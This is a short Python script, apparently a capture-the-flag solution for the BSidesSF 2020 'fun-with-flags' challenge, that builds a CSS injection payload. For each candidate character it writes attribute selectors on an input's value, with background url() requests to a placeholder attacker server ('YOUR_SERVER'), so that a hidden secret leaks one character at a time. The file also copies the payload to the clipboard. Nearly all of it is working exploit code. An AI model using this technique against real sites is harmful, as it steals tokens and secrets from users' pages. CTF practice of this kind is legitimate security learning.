# bsidessf-ctf-2020 fun-with-flags
# https://szarny.hatenablog.com/
import sys
import pyperclip

URL: str = "YOUR_SERVER"

def generate_attack_vector(known_secret: str) -> str:
    attack_vector_tmpl: str = """
        input[value^='{known_secret}{try_secret}']{{
            background: url('{url}?secret={known_secret}{try_secret}')
        }}"""

    attack_vector: str = ""

    for secret_param in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}_!?":
        attack_vector += attack_vector_tmpl.format(url=URL,
                                                   known_secret=known_secret,
                                                   try_secret=secret_param)

    attack_vector = "<style>" + attack_vector + "</style>"
    pyperclip.copy(attack_vector)
    return attack_vector


def main() -> None:
    known_secret: str = sys.argv[1] if len(sys.argv) != 1 else ""
    print(generate_attack_vector(known_secret=known_secret))


if __name__ == '__main__':
    main()
